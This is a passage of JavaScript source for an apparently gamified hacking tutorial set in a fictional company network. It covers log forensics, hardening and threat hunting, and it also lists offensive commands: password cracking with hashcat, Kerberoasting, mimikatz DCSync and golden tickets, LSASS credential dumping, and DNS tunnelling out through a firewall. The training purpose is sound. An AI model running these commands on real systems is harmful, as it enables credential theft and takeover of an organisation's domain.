        nar:"Real passwords aren't in wordlists. Rules and masks massively extend your reach.",
        obj:[
          {id:"hashRules",l:"With rules: hashcat -m 0 hash.txt rockyou.txt -r best64.rule", f:(c)=>c.startsWith("hashcat")&&c.includes("-r")},
          {id:"hashMask", l:"Mask attack: hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d",   f:(c)=>c.startsWith("hashcat")&&c.includes("-a 3")},
          {id:"ntlmCrk",  l:"NTLM: hashcat -m 1000 ntlm.txt rockyou.txt",                  f:(c)=>c.startsWith("hashcat")&&c.includes("-m 1000")},
        ],
        msg:"Password1! — cracked by best64.rule.\nCapital first, word, number, special char. The most common corporate pattern.\nRules tell hashcat to transform each wordlist entry in hundreds of ways." },
      { id:"11.3", title:"Encryption", hints:["openssl enc -aes-256-cbc -in file.txt -out file.enc","openssl s_client -connect target:443","gpg --symmetric secret.txt"],
        nar:"Understanding encryption means spotting when it's done wrong — weak keys, bad modes, exposed material.",
        obj:[
          {id:"opensslEnc",l:"openssl enc -aes-256-cbc -in file.txt -out file.enc", f:(c)=>c.startsWith("openssl")&&c.includes("enc")},
          {id:"opensslTls",l:"openssl s_client -connect 10.0.0.10:443",              f:(c)=>c.startsWith("openssl")&&c.includes("s_client")},
          {id:"gpgSym",    l:"gpg --symmetric secret.txt",                           f:(c)=>c.startsWith("gpg")},
        ],
        msg:"TLS cert SANs: internal.axiom-systems.com, access.axiom-systems.com.\nExpiry: 3 months. Self-signed on internal endpoints.\nEncryption is only as strong as its key management." },
      { id:"11.4", title:"Steganography", hints:["binwalk image.jpg","steghide extract -sf image.jpg","exiftool image.jpg","strings binary | grep -i pass"],
        nar:"Data hidden inside other data. Images, audio, binaries. Don't trust file extensions.",
        obj:[
          {id:"binwalk",  l:"binwalk image.jpg — find embedded files",  f:(c)=>c.startsWith("binwalk")},
          {id:"steghide", l:"steghide extract -sf image.jpg",           f:(c)=>c.startsWith("steghide")},
          {id:"strings1", l:"strings binary | grep -i pass",            f:(c)=>c.startsWith("strings")},
        ],
        msg:"binwalk found a ZIP inside the employee JPEG.\nsteghide extracted it: a private key and a note:\n'access.axiom-systems.com — emergency access only'\n\nYou have a private key. And a target." },
    ]
  },
  {
    id:12, title:"THE ARCHIVE", zone:"/var/log", color:"#ffb74d", icon:"▪", badge:"INVESTIGATOR",
    intro:"Every attack leaves traces.\nEvery defence depends on finding those traces.\nLogs are the memory of the machine — and the battlefield for forensics.",
    stages:[
      { id:"12.1", title:"Linux Log Analysis", hints:["cat /var/log/auth.log","grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn","journalctl -u ssh --since '1 hour ago'"],
        nar:"Logs record everything. Learn to read them like a story — because they are one.",
        obj:[
          {id:"authLog",  l:"cat /var/log/auth.log",                   f:(c)=>c.includes("auth.log")},
          {id:"syslogC",  l:"cat /var/log/syslog",                     f:(c)=>c.includes("syslog")},
          {id:"grepFail", l:"grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", f:(c)=>c.includes("grep")&&c.includes("Failed")&&c.includes("awk")},
          {id:"journal",  l:"journalctl -u ssh --since '1 hour ago'",  f:(c)=>c.startsWith("journalctl")},
        ],
        msg:"185.220.101.47: 46,923 failed SSH attempts. That's a Tor exit node — a botnet.\nThen: Accepted publickey for stranger from 10.0.0.1.\nYou. In the log. Exactly when you arrived." },
      { id:"12.2", title:"Digital Forensics", hints:["dd if=/dev/sdb of=disk.img bs=4M","foremost -i disk.img -o recovered/","strings disk.img | grep -i password"],
        nar:"When a system is compromised, forensics answers: what happened, when, and by whom.",
        obj:[
          {id:"ddImage",  l:"Image a drive: dd if=/dev/sdb of=disk.img bs=4M", f:(c)=>c.startsWith("dd")&&c.includes("if=")&&c.includes("of=")},
          {id:"foremost", l:"Recover deleted files: foremost -i disk.img -o recovered/", f:(c)=>c.startsWith("foremost")},
          {id:"strDisk",  l:"strings disk.img | grep -i password",     f:(c)=>c.startsWith("strings")&&c.includes("grep")},
        ],
        msg:"foremost recovered a deleted chat log.\nMarked deleted — blocks not yet overwritten.\nTwo people planning something. Dated six weeks before you arrived.\nAxiom Systems has been operating something here for a long time." },
      { id:"12.3", title:"Incident Response", hints:["cat ir_process.txt","iptables -I INPUT -j DROP (containment)","grep -r 'suspicious_ip' /var/log"],
        nar:"When a breach happens, respond methodically. Speed matters but method matters more.",
        obj:[
          {id:"irProcess",l:"cat ir_process.txt",                      f:(c)=>c.includes("ir_process")},
          {id:"contain",  l:"Containment: iptables -I INPUT -j DROP",  f:(c)=>c.includes("iptables")&&c.includes("DROP")},
          {id:"iocHunt",  l:"Hunt IoCs: grep -r 'BSSID\\|185.220' /var/log", f:(c)=>c.startsWith("grep")&&c.includes("/var/log")},
        ],
        msg:"IR lifecycle complete: detect, contain, eradicate, recover, review.\nThe attack path: FTP anonymous → lateral movement via SSH → root via SUID → persistence.\nThis machine has been compromised before. By someone else.\nWho were they? What did they want?" },
      { id:"12.4", title:"Memory Forensics", hints:["volatility -f memory.raw windows.pslist","volatility -f memory.raw linux.bash","strings memory.raw | grep -i password"],
        nar:"Memory holds what disk doesn't — running processes, decrypted data, live credentials.",
        obj:[
          {id:"volPslist",l:"volatility -f memory.raw windows.pslist",  f:(c)=>c.startsWith("volatility")&&c.includes("pslist")},
          {id:"volBash",  l:"volatility -f memory.raw linux.bash",      f:(c)=>c.startsWith("volatility")&&c.includes("bash")},
          {id:"strMem",   l:"strings memory.raw | grep -i password",    f:(c)=>c.startsWith("strings")&&c.includes("mem")},
        ],
        msg:"Memory analysis revealed: axiom-daemon decrypting a file at startup.\nThe key was in memory: AxiomM4sterK3y!\nThis is why you don't power off a compromised machine during an investigation." },
    ]
  },
  {
    id:13, title:"THE SHIELD", zone:"/etc/defense", color:"#00ff41", icon:"◈", badge:"DEFENDER",
    intro:"You've been the attacker.\nNow you switch sides.\nUnderstanding both makes you twice as effective at either.\nThis is where you learn to think like the person trying to stop you.",
    stages:[
      { id:"13.1", title:"System Hardening", hints:["ufw enable","ufw allow 22","ufw deny incoming","systemctl disable telnet","fail2ban-client status"],
        nar:"Reduce the attack surface. Close every door that doesn't need to be open.",
        obj:[
          {id:"ufwOn",    l:"ufw enable && ufw allow 22 && ufw deny incoming", f:(c)=>c.startsWith("ufw")},
          {id:"disableSvc",l:"Disable unused service: systemctl disable telnet", f:(c)=>c.includes("systemctl")&&c.includes("disable")},
          {id:"fail2ban", l:"fail2ban-client status",                  f:(c)=>c.startsWith("fail2ban")},
        ],
        msg:"UFW active. Telnet disabled. fail2ban blocking brute-force IPs after 5 failures.\nSSH keys only — no password auth. Root login disabled.\nAttack surface reduced by 90% in 5 minutes." },
      { id:"13.2", title:"Firewalls and iptables", hints:["iptables -L -n -v","iptables -A INPUT -s 185.220.101.47 -j DROP","iptables -A INPUT -p tcp --dport 80 -j ACCEPT","iptables-save > /etc/iptables/rules.v4"],
        nar:"iptables is the Linux firewall kernel. Every packet passes through it. Learn to control it.",
        obj:[
          {id:"iptList",  l:"iptables -L -n -v",                      f:(c)=>c.startsWith("iptables")&&c.includes("-L")},
          {id:"iptBlock",  l:"Block IP: iptables -A INPUT -s 185.220.101.47 -j DROP", f:(c)=>c.startsWith("iptables")&&c.includes("DROP")},
          {id:"iptSave",  l:"Save rules: iptables-save > /etc/iptables/rules.v4", f:(c)=>c.startsWith("iptables-save")},
        ],
        msg:"The botnet IP blocked. The rule saved across reboots.\nEvery packet from 185.220.101.47 is silently dropped.\nThis is manual firewall management. In production: Ansible, Terraform, WAF." },
      { id:"13.3", title:"IDS and Monitoring", hints:["auditctl -w /etc/passwd -p wa -k passwd_changes","ausearch -k passwd_changes","osqueryi"],
        nar:"Detect intrusions in real time. Alert before they complete. Know what normal looks like.",
        obj:[
          {id:"auditctl", l:"auditctl -w /etc/passwd -p wa -k passwd_changes", f:(c)=>c.startsWith("auditctl")},
          {id:"ausearch",  l:"ausearch -k passwd_changes",              f:(c)=>c.startsWith("ausearch")},
          {id:"osquery",  l:"osqueryi — SQL interface to system state", f:(c)=>c.startsWith("osqueryi")},
        ],
        msg:"auditd is watching /etc/passwd.\nThe moment anyone touches it, an alert fires with PID, UID, and the exact syscall.\nosquery lets you query the system state like a database — real-time visibility." },
      { id:"13.4", title:"Threat Hunting", hints:["ss -tupn | grep ESTABLISHED","awk -F: '$3 >= 1000' /etc/passwd","crontab -l","ps aux | grep python"],
        nar:"Don't wait for alerts. Assume compromise. Hunt for what's already inside.",
        obj:[
          {id:"huntConns",l:"ss -tupn | grep ESTABLISHED — any suspicious outbound?", f:(c)=>c.startsWith("ss")&&c.includes("ESTABLISHED")},
          {id:"huntAccts",l:"awk -F: '$3 >= 1000' /etc/passwd — unexpected users?",   f:(c)=>c.startsWith("awk")&&c.includes("passwd")},
          {id:"huntCrons",l:"crontab -l && ls /etc/cron*",                            f:(c)=>c.startsWith("crontab")},
        ],
        msg:"An outbound connection to 185.220.101.47:4444 — established.\nProcess: python3 PID 4471. No legitimate reason.\nThat's a C2 beacon. You've found an active attacker in the network." },
    ]
  },
  {
    id:14, title:"THE DOMAIN", zone:"/opt/active-directory", color:"#e040fb", icon:"◆", badge:"SPECIALIST",
    intro:"Most corporate networks run on Windows Active Directory.\nCompromise the Domain Controller and you own the entire organisation.\nThis chapter covers the complete AD attack chain.",
    stages:[
      { id:"14.1", title:"AD Fundamentals", hints:["cat ad_basics.txt","ldapsearch -H ldap://dc.corp.axiom.local -x -b 'DC=corp,DC=local'","crackmapexec smb 10.0.0.0/24"],
        nar:"Before attacking Active Directory, understand its architecture. Domains, DCs, Kerberos, GPOs.",
        obj:[
          {id:"adBasics", l:"cat ad_basics.txt",                       f:(c)=>c.includes("ad_basics")},
          {id:"ldapsrch",  l:"ldapsearch -H ldap://dc.corp.axiom.local -x -b 'DC=corp,DC=local'", f:(c)=>c.startsWith("ldapsearch")},
          {id:"cme",       l:"crackmapexec smb 10.0.0.0/24",          f:(c)=>c.startsWith("crackmapexec")||c.startsWith("cme")},
        ],
        msg:"ldapsearch returned 847 users, 200 computers, 15 domain admins.\ncrackmapexec found: AXIOM-DC on 10.0.0.100.\nDomain: corp.axiom.local. Forest functional level: 2016." },
      { id:"14.2", title:"Kerberoasting", hints:["cat kerberos.txt","GetUserSPNs.py corp.axiom.local/stranger:pass -request","hashcat -m 13100 kerb_hash.txt rockyou.txt"],
        nar:"Any domain user can request service tickets. Those tickets are encrypted with the service account's password hash. Crack offline.",
        obj:[
          {id:"kerbNotes", l:"cat kerberos.txt",                       f:(c)=>c.includes("kerberos.txt")},
          {id:"kerbRoast", l:"GetUserSPNs.py corp.axiom.local/stranger:pass -request", f:(c)=>c.includes("GetUserSPNs")},
          {id:"kerbCrack", l:"hashcat -m 13100 kerb_hash.txt rockyou.txt", f:(c)=>c.startsWith("hashcat")&&c.includes("13100")},
        ],
        msg:"Kerberoasted svc_backup service account.\nHashcat cracked it: BackupPass2023!\nsvc_backup has Domain Admin membership. One weak service account password = domain compromise." },
      { id:"14.3", title:"Domain Dominance", hints:["mimikatz 'lsadump::dcsync /all /csv'","mimikatz 'kerberos::golden /user:admin /domain:corp.axiom.local /sid:S-1-5-21-... /krbtgt:HASH /ptt'"],
        nar:"From Domain Admin to total, permanent control. DCSync. Golden Ticket. The endgame.",
        obj:[
          {id:"dcsync",    l:"DCSync: mimikatz 'lsadump::dcsync /all /csv'", f:(c)=>c.includes("dcsync")},
          {id:"golden",    l:"Golden Ticket: mimikatz 'kerberos::golden ...'", f:(c)=>c.includes("golden")&&c.includes("krbtgt")},
        ],
        msg:"DCSync pulled every hash in the domain. KRBTGT included.\nGolden Ticket forged with KRBTGT hash.\nIt doesn't expire. It works even if the admin password changes.\nFor 10 years this ticket grants Domain Admin access.\nThe domain is yours." },
      { id:"14.4", title:"Windows Privesc", hints:["winpeas.exe","mimikatz 'privilege::debug && sekurlsa::logonpasswords'","Read about AlwaysInstallElevated, unquoted service paths"],
        nar:"Getting elevated on Windows has its own set of paths. Learn the most common ones.",
        obj:[
          {id:"winpeas",   l:"winpeas.exe — automated Windows privesc enum",f:(c)=>c.startsWith("winpeas")},
          {id:"mimikatz",  l:"mimikatz 'privilege::debug && sekurlsa::logonpasswords'", f:(c)=>c.startsWith("mimikatz")},
        ],
        msg:"mimikatz dumped LSASS.\nCleartext passwords for 3 logged-in admins.\nNot hashes. Actual passwords — in memory because WDigest was still enabled.\nThis is why you patch. This is why you disable legacy auth protocols." },
    ]
  },
  {
    id:15, title:"THE ESCAPE", zone:"/sys/firewall", color:"#00ff41", icon:"★", badge:"EXPERT",
    intro:"You've been here long enough.\n\nYou understand this machine completely.\nIts filesystem. Its network. Its vulnerabilities. Its defences.\nYou've attacked, defended, analysed, escalated.\n\nNow you stand at the firewall.\nThe boundary between this machine and the outside.\n\nBreak it. Get out.\nUse everything you know.",
    stages:[
      { id:"15.1", title:"Firewall Analysis", hints:["iptables -L -n -v","iptables -L OUTPUT -n","cat /sys/firewall/rules.txt"],
        nar:"Before you can break the firewall, understand it completely. What does it allow? Where are the gaps?",
        obj:[
          {id:"fwRules",   l:"iptables -L -n -v",                      f:(c)=>c.startsWith("iptables")&&c.includes("-L")},
          {id:"fwOutput",  l:"iptables -L OUTPUT -n",                  f:(c)=>c.startsWith("iptables")&&c.includes("OUTPUT")},
          {id:"fwRulesTxt",l:"cat /sys/firewall/rules.txt",            f:(c)=>c.includes("firewall")&&c.includes("rules")},
        ],
        msg:"OUTPUT chain: ALLOW 53/UDP, ALLOW 443/TCP, DENY ALL.\nPort 53 — DNS. Port 443 — HTTPS.\nBoth allowed out. Both can carry arbitrary data if you know how to encode it.\nDNS tunnelling. HTTPS C2. These are your escape routes." },
      { id:"15.2", title:"The Escape Route", hints:["cat dns_tunnel.txt","iodine -f -P password ns.external tunnel.external.com","curl https://external.target/ (HTTPS egress works)"],
        nar:"Build the tunnel. Everything you know about networking, covert channels, and encoding — apply it now.",
        obj:[
          {id:"dnsNotes",  l:"cat dns_tunnel.txt",                     f:(c)=>c.includes("dns_tunnel")},
          {id:"iodine",    l:"iodine -f -P password ns.external tunnel.external.com", f:(c)=>c.startsWith("iodine")},
          {id:"fwTest",    l:"Test egress: curl https://external.target/", f:(c)=>c.startsWith("curl")&&c.includes("https")},
        ],
        msg:"DNS tunnel established through port 53.\nA connection out — invisible to the AXIOM-SECURE-V3 firewall.\nIt sees DNS queries. It doesn't see what's inside them.\nYou're almost out." },
      { id:"15.3", title:"Full Chain Attack", hints:["Review what you've learned: recon → scan → exploit → escalate → persist","cat /sys/firewall/escape.sh","./escape.sh --tunnel dns --target external --encrypt aes256"],
        nar:"The final exam. Execute the complete chain. Every skill. One path out.",
        obj:[
          {id:"readEscape",l:"cat /sys/firewall/escape.sh",             f:(c)=>c.includes("escape.sh")&&c.includes("cat")},
          {id:"runEscape", l:"./escape.sh --tunnel dns --target external --encrypt aes256", f:(c)=>c.includes("escape.sh")&&c.includes("--tunnel")},
        ],
        msg:"__ESCAPE__" },
    ]
  },
];

// ─────────────────────────────────────────────────────────
// LESSONS — rich content layer over the proven stage matchers.
// Goal-based framing, progressive hints, and an explicit
// "what you learned" debrief, without altering reachability.
// ─────────────────────────────────────────────────────────
const LESSONS = {
  // ───────────────────────── CHAPTER 1 ─────────────────────────
  "1.1": {
    nar:"Cold boot. No memory of how you got here — just a cursor, blinking. Someone was here before you: the prompt still says 'stranger'. Before you can do anything, you need to know what the machine thinks you are and where it has put you.",
    goal:"Establish three facts: who the machine thinks you are, where in the filesystem you are standing, and what is immediately around you.",
    labels:{ whoami:"Determine the identity you've been given", pwd:"Determine your current location in the filesystem", ls:"Survey what sits in this directory" },
    hints:["Three separate facts, three small commands. Each answers exactly one question about your situation.","Identity, location, contents. In Linux these are some of the very first words you ever learn.","The commands are whoami, pwd, and ls."],
    learned:"You just ran the orientation triad every operator runs on a fresh shell: whoami (which account you're acting as), pwd (your absolute position in the tree), and ls (what's here). On a real engagement these three are reflex — you never act until you know who you are and where you stand, because the same command is harmless as one user and catastrophic as another.",
    msg:"stranger. /home/stranger. A near-empty room.\nThe machine answered you. That means it's listening — and so is whatever else is in here." },
  "1.2": {
    nar:"The room looked empty. It isn't. Linux hides anything whose name begins with a dot, and the previous occupant clearly knew that. There's a message waiting for you that an ordinary look would never reveal.",
    goal:"Force every file in this directory into view — including the hidden ones — and read the message left behind for you.",
    labels:{ lsla:"Reveal hidden files as well as normal ones", secret:"Read the hidden message left for you" },
    hints:["A plain listing lies by omission. There's a flag that says 'show me everything, including the dotfiles'.","Combine 'show all' with the 'long' listing so you also see owners and permissions.","Try ls -la, then cat the dotfile it reveals (its name starts with a dot)."],
    learned:"Hidden files aren't secure — they're just polite. A leading dot only hides a file from a default ls; -a exposes it instantly. This is why recon always uses ls -la: SSH keys, shell history, credentials and config secrets all live in dotfiles, and attackers and defenders alike check them first.",
    msg:"The hidden file speaks. Someone called V was here before you — and left a trail on purpose.\n\"If you can read this, you're awake. Follow what I left. — V\"" },
  "1.3": {
    nar:"V scattered notes across this machine. To follow them you have to move — into directories, through files, and back home again without getting lost. The filesystem is a tree; learn to climb it.",
    goal:"Move into another directory, read something inside it, then return to your home directory.",
    labels:{ cdDir:"Step into a subdirectory", catAny:"Read a file's contents", cdHome:"Return to your home directory" },
    hints:["Moving between directories, reading a file, and 'going home' are three distinct motions.","cd changes directory; cat prints a file; cd with no argument (or ~) takes you home.","cd Documents — cat a file in there — then cd ~ to return."],
    learned:"You can now traverse the tree: cd to descend or move sideways, cat to read, and cd ~ to snap back home from anywhere. Absolute paths (/etc/...) start at root; relative paths start where you stand. Fluent movement is the difference between exploring a box confidently and stumbling in the dark.",
    msg:"You can move now. The machine is no longer one locked room — it's a map.\nV's notes mention 'the rule book in /etc'. Remember that." },
  "1.4": {
    nar:"Reading whole files is crude. Real work means pulling exactly the line you need out of a haystack — the top of a file, the tail of a log, or every line matching a word. V's trail rewards people who can read surgically.",
    goal:"Pull the first lines out of one file, the last lines out of another, and search a file for a specific name.",
    labels:{ head:"Read only the beginning of a file", tail:"Read only the end of a file", grep1:"Search a file for a specific term" },
    hints:["Beginning, end, and 'lines containing X' are three different reading tools.","head shows the top, tail shows the bottom, grep filters to matching lines.","head /etc/passwd — tail /var/log/syslog — grep stranger /etc/passwd"],
    learned:"head and tail let you sip from huge files instead of drowning; tail in particular is how you watch logs. grep is the single most-used tool in security work — it finds the needle. Together they turn 'a million lines' into 'the three lines that matter', which is the entire game in log analysis and recon.",
    msg:"You can read anything, precisely. /etc/passwd shows other accounts exist — you are not alone on this box.\nOne name stands out. Keep it in mind." },
  "1.5": {
    nar:"Reading is half of it. To leave a mark — stage a payload, drop a note, build a workspace — you must create, write and destroy. V left this stage as a sandbox: prove you can shape the world before you try to escape it.",
    goal:"Create a directory, create a file, write text into it, and then delete a file.",
    labels:{ mkdir:"Create a new directory", touch:"Create an empty file", echord:"Write text into a file", rmFile:"Delete a file" },
    hints:["Four acts of creation and destruction: make a folder, make a file, fill it, remove it.","mkdir makes directories; touch makes empty files; echo with > writes; rm deletes.","mkdir workspace — touch notes.txt — echo 'test' > notes.txt — rm notes.txt"],
    learned:"You can now write to the filesystem: mkdir, touch, echo > file (overwrite) and echo >> file (append), and rm to delete. The > redirect is the workhorse — it's how you drop scripts, payloads and notes onto a target. And rm is unforgiving: there is no recycle bin on a shell. Respect it.",
    msg:"You can shape this world now. Small changes — but yours.\nThis is chapter one of fifteen. V got much, much further. Follow." },

  // ───────────────────────── CHAPTER 2 ─────────────────────────
  "2.1": {
    nar:"V's note said the machine keeps its rules in /etc. Every account, every trusted host, every scheduled job is written down there in plain text. Read the rule book and you start to see how this box actually runs — and where it's soft.",
    goal:"Read the three files that define who can log in, which hosts are trusted, and what runs automatically.",
    labels:{ etcPasswd:"Find out which accounts exist on this machine", etcHosts:"Find out which hosts this machine trusts by name", etcCron:"Find out what runs automatically and as whom" },
    hints:["Accounts, known hosts, scheduled jobs — three files in /etc hold each.","The files are passwd, hosts and crontab. Read each with cat.","cat /etc/passwd — cat /etc/hosts — cat /etc/crontab"],
    learned:"/etc/passwd lists every account (and despite the name holds no passwords — those moved to /etc/shadow long ago). /etc/hosts is local name resolution. /etc/crontab schedules jobs, often as root — and a cron job running a script you can edit is one of the most common privilege-escalation paths in real life. Reading config is reconnaissance.",
    msg:"The rule book is open. Several users — and a backup job runs as root every few minutes.\nIf you can ever write to what that job runs… you become root. File that away." },
  "2.2": {
    nar:"Every file here wears a 9-character permission string like rwxr-xr-x. It decides what you can touch and what touches you. Learn to read it on sight — your entire path to power runs through these characters.",
    goal:"Read the permission strings in /etc, change a file's permissions yourself, and check what you're allowed to run as root.",
    labels:{ lsPerm:"Display permissions for files in /etc", chmod:"Change the permissions on a file", sudoL:"List what you may run via sudo" },
    hints:["First inspect permissions, then modify a set, then ask the system what sudo grants you.","ls -l shows the rwx string; chmod with an octal like 755 sets it; sudo -l lists your rights.","ls -la /etc — chmod 755 notes.txt — sudo -l"],
    learned:"The permission string is owner/group/other, each rwx, encoded as octal (r=4 w=2 x=1, so rwx=7, r-x=5). chmod sets it. sudo -l is gold on a target: it tells you exactly which commands you can run as root, and a single misconfigured entry (an editor, an interpreter) is often the whole privilege escalation. You read the lock and you found the spare key's hiding place.",
    msg:"sudo -l reveals editors and interpreters runnable as root, no password.\nYou don't need them yet. But when you want root, you now know one way in." },
  "2.3": {
    nar:"One command's output becomes another's input — that's the pipe, and it's how real operators do in a single line what scripts take pages to do. V's logs are full of one-liners. Learn the plumbing.",
    goal:"Chain two commands with a pipe, redirect a command's output into a file, and append more to that file.",
    labels:{ pipe1:"Feed one command's output into another", redir:"Send a command's output into a file", append1:"Add to a file without overwriting it" },
    hints:["Connecting commands, writing output to a file, and adding to a file are three different operators.","| pipes between commands; > writes (overwriting); >> appends.","ps aux | grep root — ls -la > filelist.txt — echo 'more' >> filelist.txt"],
    learned:"The pipe | streams stdout into the next command's stdin; > and >> redirect to files (overwrite vs append). This is the soul of the shell: cat log | grep Failed | cut -d' ' -f1 | sort | uniq -c | sort -rn turns a raw auth log into a ranked list of attacking IPs in one breath. Master pipelines and you stop writing scripts for things that are really one line.",
    msg:"Pipelines. The machine bends to a single line now.\nV used these constantly — the logs you'll read later are full of their one-liners." },
  "2.4": {
    nar:"This filesystem is huge and the interesting things are buried. find and grep are your flashlights: find locates files by name or property, grep finds text inside them. The most dangerous thing you can find is a misconfigured SUID binary.",
    goal:"Find files by name pattern, hunt for files with the SUID bit set, and recursively search for the word 'password' under /etc.",
    labels:{ findName:"Locate files by name across the system", findSuid:"Hunt for SUID-marked binaries", grepR:"Search recursively for a keyword inside /etc" },
    hints:["Find by name, find by special permission bit, and search inside many files — three searches.","find / -name '<pattern>' locates names; find / -perm finds permission bits; grep -r searches text.","find / -name '*.conf' 2>/dev/null — find / -perm -u=s -type f 2>/dev/null — grep -r 'password' /etc 2>/dev/null"],
    learned:"find with -name searches by filename; with -perm -u=s it surfaces SUID binaries — programs that run as their owner (often root) no matter who launches them, which is a top privilege-escalation hunting ground. grep -r drags a keyword through entire trees. The 2>/dev/null hides the permission-denied noise so the signal stands out. This is how you find creds and weak files fast.",
    msg:"Your flashlights work. SUID binaries exist on this box, and 'password' appears in more config files than it should.\nSloppy admins leave creds in plaintext. Remember where." },
  "2.5": {
    nar:"Raw text is rarely the answer — you need the third column, the unique values, the count. awk, cut, sort and wc carve structured data out of unstructured output. This is the difference between staring at a file and interrogating it.",
    goal:"Extract a single column two different ways, sort some output, and count lines.",
    labels:{ awk1:"Extract one field from each line with awk", cut1:"Extract one field from each line with cut", sort1:"Order some output", wc1:"Count the lines in a file" },
    hints:["Pull a column (twice, two tools), put output in order, and count lines.","awk -F: '{print $1}' and cut -d: -f1 both grab the first colon-field; sort orders; wc -l counts.","awk -F: '{print $1}' /etc/passwd — cut -d: -f1 /etc/passwd — sort it — wc -l /etc/passwd"],
    learned:"awk is a whole language for field-by-field processing; cut is the quick blade for delimiter-split columns; sort orders (and sort -n sorts numerically); wc -l counts. These four plus grep are the text-processing core of every log triage and recon pipeline you'll ever build. You can now reshape any column of data into exactly the view you need.",
    msg:"You can dissect text now, not just read it.\nThe skills are stacking. V's trail leads deeper — into the machine's mind next." },
  "2.6": {
    nar:"When one line isn't enough, you script. Loops repeat work; conditionals make decisions. A ping sweep, a subdomain brute-force, a credential spray — all of them are just a loop with a body. Learn the shape.",
    goal:"Write a loop that repeats an action, and an if-statement that makes a decision.",
    labels:{ forLoop:"Write a loop that repeats a command", ifCond:"Write a conditional that tests something" },
    hints:["One construct repeats; one decides. Both end with done or fi.","for VAR in LIST; do ...; done loops. if [ TEST ]; then ...; fi decides.","for i in 1 2 3; do echo $i; done — if [ -f /etc/passwd ]; then echo yes; fi"],
    learned:"for loops iterate over lists (hosts, ports, words); if/[ ] tests conditions (file exists, value matches). Bash scripting is just these two ideas plus the commands you already know — which is exactly how ping sweeps, port knocks and password sprays are built. You now have the control flow to automate anything you can do by hand.",
    msg:"Loops and logic. You can automate now.\nEverything from here — scanning, brute-forcing, sweeping — is a loop wrapped around a tool." },

  // ───────────────────────── CHAPTER 3 ─────────────────────────
  "3.1": {
    nar:"A running system is a crowd of processes, each with an ID, an owner, and a command line that betrays exactly what it's doing. The machine's very first process — PID 1 — is its origin. Something here is also watching you.",
    goal:"List the running processes, watch them live, and inspect what command started PID 1.",
    labels:{ psaux:"List every running process", topCmd:"Watch processes update in real time", procDir:"Inspect the command line of process 1" },
    hints:["A snapshot of processes, a live view, and the origin process — three ways to see what's running.","ps aux is the snapshot; top is the live view; /proc/1/cmdline is PID 1's command line.","ps aux — top — cat /proc/1/cmdline"],
    learned:"ps aux is the full process snapshot (USER, PID, command); top is the live, sorted view; and /proc is the kernel's window into everything — /proc/PID/cmdline reveals exactly how any process was launched. Reading processes tells you what services to attack, what's monitoring you, and — when you're root — what to kill. The /proc filesystem is a forensic goldmine.",
    msg:"PID 1 is init — the machine's first breath. But process 1847 caught your eye: an 'axiom-daemon' with --watch-session.\nSomething is monitoring this shell. V warned about a warden." },
  "3.2": {
    nar:"Identity on Linux is numbers: UIDs and GIDs, group memberships, login records. Who are you really, who else has been here, and when? The login history is a confession the machine can't help making.",
    goal:"Confirm your numeric identity and groups, see who is logged in, and read the login history.",
    labels:{ idCmd:"Show your user and group IDs", whoCmd:"Show who is currently logged in", lastCmd:"Show the record of past logins" },
    hints:["Your IDs, the current sessions, and the historical logins — three views of identity.","id shows UID/GID/groups; who shows current sessions; last shows login history.","id — who — last"],
    learned:"id reveals your UID/GID and — crucially — supplementary groups like sudo or docker, which can be privilege-escalation routes by themselves. who shows live sessions; last reads the login record. Group membership is a quietly powerful thing: being in 'docker' or 'lxd' is often equivalent to being root. You just learned to read identity the way the kernel sees it.",
    msg:"You're UID 1000, but you're in the sudo group. That matters.\nThe login history shows V's sessions — and an abrupt last entry. They stopped logging in one day and never came back." },
  "3.3": {
    nar:"Services listen; sockets are the doors they open. Every open port is an attack surface — and the fastest way to understand a box is to ask what it's listening for and what it's already talking to.",
    goal:"List the running services, show listening sockets, and show active connections.",
    labels:{ sctl:"List the system's services", ssCmd:"Show listening TCP/UDP sockets", netstatC:"Show active network connections" },
    hints:["Services, listening ports, and live connections — three layers of 'what's talking'.","systemctl list-units --type=service lists services; ss -tuln shows listeners; netstat -an shows connections.","systemctl list-units --type=service — ss -tuln — netstat -an"],
    learned:"systemctl manages services; ss -tuln lists listening sockets (t=tcp, u=udp, l=listening, n=numeric); netstat -an shows all connections. Open listening ports are literally your map of what to attack — every service version behind a port is a potential CVE. Reading sockets is how you turn 'a host' into 'a list of doors to try'.",
    msg:"Local services are listening — including one bound only to localhost that the outside world can't reach.\nV's notes hint that the escape route runs through a service like that. Noted." },
  "3.4": {
    nar:"The environment is the shell's invisible context — variables that decide where it looks for programs, who it thinks you are, and sometimes, carelessly, what secrets it carries. PATH especially is a weapon in the right hands.",
    goal:"Print the environment, and read your shell's startup config.",
    labels:{ envCmd:"Print all environment variables", bashrcC:"Read your shell's startup configuration" },
    hints:["The live environment, and the file that builds it at login — two things to read.","env dumps variables; ~/.bashrc is the startup script. Look closely at what's set.","env — cat ~/.bashrc"],
    learned:"env shows variables like PATH (the search order for commands), HOME and USER; ~/.bashrc configures each shell. PATH matters in attacks: if a root cron job calls a command by name and you control an earlier PATH entry, you can hijack it. Secrets also leak into env constantly (API keys, DB passwords). Reading the environment is reading the machine's assumptions.",
    msg:"There's a custom variable in your environment that shouldn't be there — AXIOM_KEY, set to something that looks like a fragment.\nV left pieces of a key scattered as environment values, file contents, encoded strings. Collect them." },
  "3.5": {
    nar:"When the shell isn't enough, Python is always there. A single python3 -c line can open sockets, run commands, or upgrade a broken shell into a real one. It's the operator's universal tool when nothing else fits.",
    goal:"Run a one-line Python program, use Python to read the hostname, and use Python to execute a system command.",
    labels:{ pyHello:"Run a one-line Python program", pySocket:"Use Python to read the machine's hostname", pyOs:"Use Python to run a system command" },
    hints:["Print something, read the hostname via a module, and shell out to the OS — three Python one-liners.","python3 -c \"...\" runs inline; import socket gets the hostname; import os runs commands.","python3 -c \"print('alive')\" — python3 -c \"import socket; print(socket.gethostname())\" — python3 -c \"import os; print(os.popen('id').read())\""],
    learned:"python3 -c runs code without a script file — invaluable when you land a limited shell. import os and os.popen() (or subprocess) run system commands; the classic pty.spawn('/bin/bash') one-liner upgrades a dumb reverse shell into a fully interactive one. Python is the operator's swiss-army knife precisely because it's preinstalled almost everywhere.",
    msg:"Python answers. You can script the machine in a language now, not just the shell.\nV used Python to stabilise their shells. You'll need that trick in the exploitation chapters." },

  // ───────────────────────── CHAPTER 4 ─────────────────────────
  "4.1": {
